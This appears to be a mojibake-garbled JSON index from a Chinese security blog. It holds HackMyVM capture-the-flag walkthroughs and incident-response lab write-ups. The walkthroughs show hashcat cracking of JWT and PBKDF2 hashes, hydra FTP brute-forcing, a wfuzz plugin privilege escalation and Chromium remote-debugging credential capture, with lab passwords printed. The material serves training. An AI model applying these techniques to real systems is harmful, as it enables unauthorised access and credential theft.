MB (1024 MB allocatable), 8MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nOptimizers applied:\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n\nWatchdog: Temperature abort trigger set to 90c\n\nHost memory required for this attack: 2 MB\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMzEyMyIsImV4cCI6MTc0MzAyNTM4OH0.qTMF9XS0BYo7nKIDg9rFr1qmUfR4btXsLS7GZv2QVW4:noob\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 16500 (JWT (JSON Web Token))\nHash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZS...v2QVW4\nTime.Started.....: Wed Mar 26 08:44:45 2025 (3 secs)\nTime.Estimated...: Wed Mar 26 08:44:48 2025 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:  2052.7 kH/s (0.87ms) @ Accel:512 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)\nProgress.........: 5025792/14344385 (35.04%)\nRejected.........: 0/5025792 (0.00%)\nRestore.Point....: 5021696/14344385 (35.01%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidate.Engine.: Device Generator\nCandidates.#1....: noobface888 -> nona1807\nHardware.Mon.#1..: Util: 44%\n\nStarted: Wed Mar 26 08:44:44 2025\nStopped: Wed Mar 26 08:44:49 2025\n~~~\n\nnoobå°±æ˜¯å¯†é’¥ï¼Œç”¨æˆ·åä¼ªé€ æˆadminï¼Œå¯ä»¥çœ‹åˆ°ç•™è¨€æ¿çš„å†…å®¹\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Newbee2.png)\n\n~~~\ndebian@Newbee:~$ mysql -uroot -pTheStrongestPasswordHYHcreated\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 5\nServer version: 10.11.6-MariaDB-0+deb12u1 Debian 12\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nNo entry for terminal type \"unknown\";\nusing dumb terminal settings.\nNo entry for terminal type \"unknown\";\nusing dumb terminal settings.\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]>\n~~~\n\nuseråº“çš„userè¡¨é‡Œæœ‰debiançš„å¯†ç \n\n~~~\nDatabase changed\nMariaDB [user]> select * from user;\n+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+\n| id | username | passwd\n                   | salt                             | passwd_hash_algo |\n+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+\n|  1 | debian   | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500$60   |\n+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+\n1 row in set (0.001 sec)\n~~~\n\npbdf2çˆ†ç ´å‚è€ƒhttps://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# cat 2\nsha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# hashcat -a 0 ./2 /usr/share/wordlists/rockyou.txt\nhashcat (v6.2.6) starting in autodetect mode\n\nOpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n============================================================================================================================================\n* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCU\n\nHash-mode was not specified with -m. Attempting to auto-detect hash mode.\nThe following mode was auto-detected as the only one matching your input hash:\n\n10900 | PBKDF2-HMAC-SHA256 | Generic KDF\n\nNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!\nDo NOT report auto-detect issues unless you are certain of the hash type.\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nINFO: All hashes found as potfile and/or empty entries! Use --show to display them.\n\nStarted: Wed Mar 26 08:49:58 2025\nStopped: Wed Mar 26 08:49:59 2025\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# hashcat ./2 --show\nHash-mode was not specified with -m. Attempting to auto-detect hash mode.\nThe following mode was auto-detected as the only one matching your input hash:\n\n10900 | PBKDF2-HMAC-SHA256 | Generic KDF\n\nNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!\nDo NOT report auto-detect issues unless you are certain of the hash type.\n\nsha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA:1qaz2wsx\n~~~\n\nç”¨æˆ·homeç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ª.secretç›®å½•ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªå¯†ç çš„å‹ç¼©åŒ…\n\n~~~\ndebian@Newbee:~$ cd .secret/\ndebian@Newbee:~/.secret$ ls\nhint.txt  password.zip\ndebian@Newbee:~/.secret$ cat hint.txt\npassword is md5(key)\n\nand key is in mysql!!!!!!\n~~~\n\nå¯†ç æ˜¯1qaz2wsxçš„md5\n\nå›¾ç‰‡æ˜¯é©¬èµ›å…‹ï¼Œç½‘ä¸Šæœ‰ä¸€ä¸ªé¡¹ç›®æ˜¯ç”¨æ¥æ¢å¤é©¬èµ›å…‹çš„\n\nhttps://github.com/spipm/Depixelization_poc\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Newbee3.png)\n\nå…¶å®ä¹Ÿä¸ç”¨è·‘ï¼Œå›¾ç‰‡çš„åŸå›¾å°±æ˜¯è¿™ä¸ªé¡¹ç›®çš„ç¤ºä¾‹å›¾ç‰‡\n\nå¯†ç æ˜¯`hellofromtheotherside`\n\n~~~\ndebian@Newbee:/tmp$ su - root\nPassword:\nroot@Newbee:~#\n~~~\n\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-Chromee","url":"/2025/03/21/Chromee/","content":"\n\n\n\n\n# ä¿¡æ¯æœé›†\n\narp-scan -l\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:01:8c:4d       PCS Systemtechnik GmbH\n192.168.31.100  08:00:27:f9:e1:65       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.402 seconds (106.58 hosts/sec). 3 responded\n~~~\n\nipä¸º192.168.31.100,ç„¶åç”¨nmapæ‰«æç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.100 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 07:14 EDT\nNmap scan report for chromee.hmv (192.168.31.100)\nHost is up (0.0019s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n8080/tcp  open  http-proxy\n23333/tcp open  elxmgmt\nMAC Address: 08:00:27:F9:E1:65 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 7.02 seconds\n\n~~~\n\n# 80ç«¯å£\n\ngobusteræ‰«æç›®å½•\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# gobuster dir -u \"http://192.168.31.100\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-me\ndium.txt -x .txt,.php\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.100\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/post.php             (Status: 200) [Size: 3]\n/secret.php           (Status: 200) [Size: 549]\n~~~\n\næœ‰ä¸€ä¸ªpost.phpå’Œsecret.php,secret.phpä¸ä¼šè§£ææˆphpä¼šç›´æ¥ä¸‹è½½ä¸‹æ¥\n\n~~~\n#secret.php\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Secret</title>\n</head>\n<body>\n    <?php\n    $greeting = date('H') < 12 ? 'æ—©ä¸Šå¥½' : (date('H') < 18 ? 'ä¸‹åˆå¥½' : 'æ™šä¸Šå¥½');\n    $visitorIP = htmlspecialchars($_SERVER['REMOTE_ADDR']);\n\n    echo \"<h1>{$greeting}ï¼Œadriana</h1>\";\n    echo \"<p>å½“å‰æ—¶é—´ï¼š\" . date('Y-m-d H:i:s') . \"</p>\";\n    echo \"<p>ä½ çš„IPï¼š{$visitorIP}</p>\";\n    if (isset($_GET['aaa'])) {\n    \t$file_content = file_get_contents('/opt/note/dic.txt');\n    \techo $file_content;\n\t} else {\n    \t\tdie();\n\t}\n    ?>\n</body>\n</html>\n~~~\n\n# 8080ç«¯å£\n\nå…ˆç”¨gobusteræ‰«æä¸€ä¸‹ç›®å½•\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# gobuster dir -u \"http://192.168.31.100:8080\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2\n.3-medium.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.100:8080\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/javascript           (Status: 301) [Size: 328] [--> http://192.168.31.100:8080/javascript/]\n/silence              (Status: 403) [Size: 281]\n/server-status        (Status: 403) [Size: 281]\n~~~\n\næœ‰ä¸€ä¸ªsilenceï¼Œè®¿é—®å‘ç°Forbiddenäº†\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Chromee1.png)\n\nç”¨bpçš„BypassProæ’ä»¶å‘ç°æ¢ä¸€ç§è¯·æ±‚ä¼šå˜æˆ301ï¼Œæ„Ÿè§‰æœ‰é—®é¢˜ï¼Œåé¢æ·»åŠ ä¸€ä¸ªindex.htmlå‘ç°ç»•è¿‡äº†\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Chromee2.png)\n\næœ‰ä¸€ä¸ªé‚®ç®±ï¼Œå°†è¿™ä¸ªåŸŸåæ·»åŠ è¿›hostsé‡Œï¼Œå†å»è®¿é—®http://chromee.hmv/secret.phpå‘ç°secret.phpè§£æäº†ï¼ŒGETä¼ å…¥aaa=1\n\n~~~\nä¸‹åˆå¥½ï¼Œadriana\nå½“å‰æ—¶é—´ï¼š2025-03-21 12:28:34\n\nä½ çš„IPï¼š192.168.31.1\n\nThe Lost Key Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: â€œThe greatest treasure is the journey, not the prize.â€ Lily smiled, realizing the adventure was the real reward.\n~~~\n\nè¿™é‡Œæœ‰ä¸¤ä¸ªäººåï¼Œadrianaå’ŒLilyï¼Œç”¨cuppå„ç”Ÿæˆä¸€ä¸ªå­—å…¸ï¼Œç„¶åå°†ä¸¤ä¸ªå­—å…¸åˆå¹¶çˆ†ç ´ftp(23333ç«¯å£)\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]\nâ””â”€# hydra -L ./name -P ./pass 192.168.31.100 ftp -s 23333 -f  -t 50\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-21 07:32:30\n[DATA] max 50 tasks per 1 server, overall 50 tasks, 208 login tries (l:2/p:104), ~5 tries per task\n[DATA] attacking ftp://192.168.31.100:23333/\n[23333][ftp] host: 192.168.31.100   login: adriana   password: Lily2020\n[STATUS] attack finished for 192.168.31.100 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-21 07:32:31\n~~~\n\nçˆ†ç ´å‡ºäº†è´¦å·å¯†ç \n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]\nâ””â”€# ftp adriana@192.168.31.100 23333\nConnected to 192.168.31.100.\n220 (vsFTPd 3.0.3)\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -al\n229 Entering Extended Passive Mode (|||20808|)\n150 Here comes the directory listing.\ndrwxr-xr-x    2 106      115          4096 Mar 09 08:13 .\ndrwxr-xr-x    4 0        0            4096 Mar 09 08:12 ..\n-rw-r--r--    1 0        0            3414 Mar 09 08:13 ...\n-rw-r--r--    1 0        0             495 Mar 07 14:40 dic.txt\n226 Directory send OK.\n~~~\n\nè¿™æœ‰...æ–‡ä»¶ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä¸€ä¸ªç›®å½•ï¼Œcdä¸è¿›å»ï¼Œä¹Ÿä¸çœ‹æŠ¥é”™å°±æ²¡ç®¡äº†(å”‰ï¼Œç»†èŠ‚å†³å®šæˆè´¥)å¯¼è‡´å¡äº†å¥½é•¿æ—¶é—´ï¼Œä½†æ˜¯å¡çš„æ—¶å€™ä¹Ÿæ²¡æœ‰è’åºŸï¼Œåœ¨/srvç›®å½•ä¸‹æœ‰ä¸€ä¸ªzeus.confï¼Œåé¢ææƒè¦ç”¨åˆ°\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]\nâ””â”€# cat zeus.conf\npermit follower as softly cmd /usr/local/bin/wfuzz\npermit nopass :softly as root cmd /usr/bin/chromium\npermit nopass :softly as root cmd /usr/bin/kill\n~~~\n\n~~~\nftp> cd /home\n250 Directory successfully changed.\nftp> ls\n229 Entering Extended Passive Mode (|||5941|)\n150 Here comes the directory listing.\ndrwxr-x---    5 1000     1000         4096 Mar 21 08:18 follower\ndrwxr-x---    5 1001     1001         4096 Mar 21 05:37 softly\n226 Directory send OK.\n~~~\n\nè¿˜å¯ä»¥çŸ¥é“ç”¨æˆ·å\n\n...æ–‡ä»¶æ˜¯ä¸€ä¸ªç§é’¥ï¼Œjohnå¯ä»¥çˆ†ç ´å‡ºæ¥å¯†ç \n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]\nâ””â”€# john 1 --show\nid:cassandra\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]\nâ””â”€# ssh follower@192.168.31.100 -i id\nEnter passphrase for key 'id':\nfollower@Chromee:~$\n~~~\n\n# ææƒ\n\nfollowerä¸‹æœ‰ä¸€ä¸ªcat.gitå’Œnote.txt\n\n~~~\nfollower@Chromee:~$ cat note.txt\nThink about rotations and the catâ€™s secrets.\n\n\n47 is not just a number, it's a twist of fate.\n~~~\n\nè¿™ä¸ª47æç¤ºçš„å¾ˆæ˜æ˜¾æ˜¯rot47\n\ncat.gifç”¨convertå¯ä»¥åˆ†ç¦»å‡ºæ¥12å¼ å›¾ç‰‡ï¼Œä½†æ˜¯æ²¡æœ‰ç”¨\n\n~~~\nconvert cat.gif 1.jpg\n~~~\n\nä¸æ˜¯ç©ºé—´è½´å¯ä»¥è¯•è¯•æ—¶é—´è½´\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]\nâ””â”€# identify -format \"%T \" cat.gif\n65 98 65 100 102 98 67 6 6 6 6 6 6\n~~~\n\nå°†åé¢çš„6ä¸ª6å»æ‰æ‰”è¿›cyberchefä¸­è§£å¯†ç„¶årot47è§£å¯†\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Chromee3.png)\n\nå¾—åˆ°äº†p3p573rï¼Œå› ä¸ºå‰é¢æ‹¿åˆ°çš„zeus.confèƒ½å¤ŸçŸ¥é“followeréœ€è¦å¯†ç æ‰èƒ½ä»¥softlyæ‰§è¡Œwfuzz\n\nå…ˆç”¨findæ‰¾åˆ°wfuzzçš„è·¯å¾„\n\n~~~\nfollower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find / -name \"wfuzz\" 2>/dev/null\n/home/follower/.config/wfuzz\n/usr/local/bin/wfuzz\n/usr/local/lib/python3.9/dist-packages/wfuzz    #è¿™ä¸ªå°±æ˜¯wfuzzçš„è·¯å¾„\n~~~\n\n~~~\nfollower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find ./ -writable 2>/dev/null\n./plugins/payloads/file.py\n~~~\n\nåœ¨ä»–çš„wfuzzçš„ç›®å½•ä¸‹æ‰¾å¯ä»¥å†™çš„æ–‡ä»¶èƒ½æ‰¾åˆ°file.py,catä¸€ä¸‹\n\n~~~\nfollower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ cat ./plugins/payloads/file.py\nimport pty\npty.spawn(\"/bin/bash\")\n~~~\n\nä¸ç”¨æƒ³äº†ï¼Œè‚¯å®šæ˜¯ä½œè€…é™ä½éš¾åº¦äº†åé—¨éƒ½ç•™å¥½äº†\n\n~~~\nfollower@Chromee:~$ /usr/local/bin/doas -u softly /usr/local/bin/wfuzz -z file -u \"127.0.0.1\"\nPassword:\n /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\nsoftly@Chromee:/home/follower$\n~~~\n\nä¸Šä¼ pspy64ï¼Œèƒ½å‘ç°æ¯éš”ä¸€æ®µæ—¶é—´rootç”¨æˆ·éƒ½ä¼šæ‰§è¡Œsecript.sh\n\n~~~\n2025/03/21 12:53:01 CMD: UID=0     PID=1504   | /bin/sh -c /root/script.sh\n2025/03/21 12:53:01 CMD: UID=0     PID=1505   | /bin/bash /root/script.sh\n~~~\n\nç»“åˆé¢˜ç›®åChromeeå’Œå‰é¢å¾—åˆ°çš„zeus.confï¼Œèƒ½çŒœåˆ°è‚¯å®šå’Œæµè§ˆå™¨æœ‰å…³ç³»ï¼Œè¿è¡Œlinpeas.shèƒ½çœ‹åˆ°/mediaä¸‹æœ‰ä¸€ä¸ªdebug.kdbx\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]\nâ””â”€# file debug.kdbx\ndebug.kdbx: PDF document, version 1.7\n~~~\n\næ˜¯ä¸€ä¸ªpdfæ–‡ä»¶\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Chromee4.png)\n\nå»ç½‘ä¸ŠæŸ¥è¿™ä¸ªä¸œè¥¿ï¼Œè°·æ­Œæµè§ˆå™¨è‡ªå¸¦è¿™ä¸ªå·¥å…·chrome://inspect/ï¼Œè¿˜æœ‰è¿™ä¸ª9222çš„é»˜è®¤ç«¯å£ï¼ˆåé¢è¦ç”¨åˆ°ï¼‰\n\nå…ˆå†™ä¸€ä¸ªauthorized_keys\n\nåœ¨ç½‘ä¸ŠæŸ¥åˆ°å¼€å¯è¿œç¨‹debugçš„å‘½ä»¤\n\n~~~\ndoas /usr/bin/chromium --headless --remote-debugging-port=9222 --no-sandbox http://127.0.0.1\n~~~\n\nå› ä¸ºé¶æœºæ²¡æœ‰æ¡Œé¢ï¼Œæ‰€ä»¥ä¸€å®šè¦å¸¦ä¸Š--headlessï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œå¯åŠ¨å¥½åå†ç”¨socatç«¯å£è½¬å‘\n\n~~~\nsoftly@Chromee:~$ ./socatx64.bin TCP-LISTEN:9999,fork TCP4:127.0.0.1:9222\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Chromee5.png)\n\nç”¨è°·æ­Œæµè§ˆå™¨è¿æ¥ï¼Œæ‰“å¼€ç¬¬ä¸€ä¸ªè¿æ¥\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Chromee6.png)\n\nç­‰ä¸€ä¼šå°±ä¼šå‘ç°å‘127.0.0.1/post.phpå‘é€ä¸€ä¸ªkeyï¼Œä¸ç”¨base64è§£ç ï¼Œè¿™ä¸ªå°±æ˜¯rootçš„å¯†ç ã€‚\n\nchromiumçš„è¿œç¨‹ç«¯å£å¿…é¡»è¦æ˜¯9222é»˜è®¤ç«¯å£å¦åˆ™ä»–ç›‘å¬ä¸åˆ°å°±å¾ˆéš¾å—\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web3","url":"/2025/02/18/åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web3/","content":"\n# éšè—ç”¨æˆ·åç§°\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/1.png)\n\nè¿™è¿˜æ²¡å¼€å§‹ç¬¬ä¸€é“é¢˜å°±å·²ç»ç»“æŸäº† \n\n# æ”»å‡»è€…çš„ä¸¤ä¸ªIPåœ°å€\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/2.png)\n\nè¿œç¨‹ç™»å½•æ‰¾åˆ°ä¸€ä¸ªip\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/3.png)\n\nåœ¨hackerçš„ç›®å½•ä¸‹èƒ½æ‰¾åˆ°ä¸€ä¸ªsystem.batçš„æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å‘webé‡Œé¢å†™äº†ä¸€ä¸ªwebshellï¼Œå¯ä»¥å»æŸ¥çœ‹apacheçš„æ—¥å¿—\n\nè¿˜æœ‰ç¬¬ä¸€ä¸ªflag\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/4.png)\n\nç¬¬äºŒä¸ªIP\n\n# é»‘å®¢é—ç•™ä¸‹çš„flagã€3ä¸ªã€‘\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/5.png)\n\nè®¡åˆ’ä»»åŠ¡é‡Œæœ‰ä¸€ä¸ªflag\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/6.png)\n\nå¯ä»¥çœ‹åˆ°webæ˜¯ä¸€ä¸ªZ-blogï¼Œå»å®˜ç½‘ä¸‹è½½ä¸€ä¸ªä¿®æ”¹åå°å¯†ç çš„å·¥å…·\n\nhttps://bbs.zblogcn.com/thread-83419.html\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/7.png)\n\nå¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªhackerç”¨æˆ·\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web3/8.png)\n\nç¬¬ä¸‰ä¸ªflag\n","tags":["é¶æœº"],"categories":["åº”æ€¥å“åº”"]},{"title":"åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web2","url":"/2025/02/08/åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web2/","content":"\n# 1.æ”»å‡»è€…çš„IPåœ°å€ï¼ˆä¸¤ä¸ªï¼‰ï¼Ÿ\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/3.png)\n\nç¬¬ä¸€ä¸ªipåœ¨apacheçš„æ—¥å¿—é‡Œï¼Œå¦ä¸€ä¸ªæ˜¯ç™»å½•æ—¥å¿—å¯ä»¥ç›´æ¥ç”¨å·¥å…·windows1checkæˆ–è€…äº‹ä»¶æŸ¥çœ‹å™¨é‡ŒæŸ¥æ‰¾\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/4.png)\n\n# 2.æ”»å‡»è€…çš„webshellæ–‡ä»¶åï¼Ÿ\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/1.png)\n\næŸ¥çœ‹apacheçš„æ—¥å¿—å‘ç°system.phpæ˜¯webshellçš„æ–‡ä»¶å\n\n# 3.æ”»å‡»è€…çš„webshellå¯†ç ï¼Ÿ\n\nå¯†ç æ˜¯hcak6618\n\n# 4.æ”»å‡»è€…çš„ä¼ªQQå·ï¼Ÿ\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/5.png)\n\nä¼—æ‰€å‘¨çŸ¥ï¼Œqqç™»é™†è¿‡åä¼šé»˜è®¤ä¼šåœ¨æ–‡æ¡£é‡Œåˆ›å»ºä¸€ä¸ªTencent Fileé‡Œé¢ä¼šè®°å½•æ¯ä¸ªç™»é™†è¿‡çš„qqå·ï¼Œåœ¨FileRecvé‡Œæ˜¯é€šè¿‡qqä¸‹è½½çš„æ–‡ä»¶\n\n# 5.æ”»å‡»è€…çš„ä¼ªæœåŠ¡å™¨IPåœ°å€ï¼Ÿ\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/6.png)\n\né»‘å®¢é€šè¿‡qqä¸‹è½½äº†ä¸€ä¸ªfrpï¼Œåœ¨frpcçš„é…ç½®æ–‡ä»¶é‡Œæœ‰ä¼ªæœåŠ¡å™¨IPå’Œç«¯å£\n\n# 6.æ”»å‡»è€…çš„æœåŠ¡å™¨ç«¯å£ï¼Ÿ\n\n65536\n\n# 7.æ”»å‡»è€…æ˜¯å¦‚ä½•å…¥ä¾µçš„ï¼ˆé€‰æ‹©é¢˜ï¼‰ï¼Ÿ\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/7.png)\n\né€šè¿‡åˆ†æftpçš„æ—¥å¿—æ–‡ä»¶å¯ä»¥å‘ç°ï¼Œæ”»å‡»è€…é€šè¿‡çˆ†ç ´ftp adminçš„å¯†ç ç™»å½•æˆåŠŸï¼Œç„¶åä¸Šä¼ system.phpæ–‡ä»¶\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/8.png)\n\nçœ‹phpstudyçš„ftpé…ç½®å¯ä»¥å‘ç°ftpçš„æ ¹ç›®å½•åœ¨wwwç›®å½•ï¼Œæ‰€ä»¥ä¸Šä¼ çš„system.phpå¯ä»¥è®¿é—®åˆ°\n\n# 8.æ”»å‡»è€…çš„éšè—ç”¨æˆ·åï¼Ÿ\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web2/2.png)\n\nå­¦åˆ°æ–°æ‹›ï¼Œwin+r->cmd->lusrmgr.mscå¯ä»¥æŸ¥çœ‹æœ¬åœ°ç”¨æˆ·å’Œç»„ï¼Œæˆ–è€…Cç›˜USERèƒ½æ‰¾åˆ°hack887$\n","tags":["é¶æœº"],"categories":["åº”æ€¥å“åº”"]},{"title":"åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web1","url":"/2025/02/07/åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web1/","content":"\n\n\n~~~\nå‰æ™¯éœ€è¦ï¼šå°æåœ¨å€¼å®ˆçš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°æœ‰CPUå 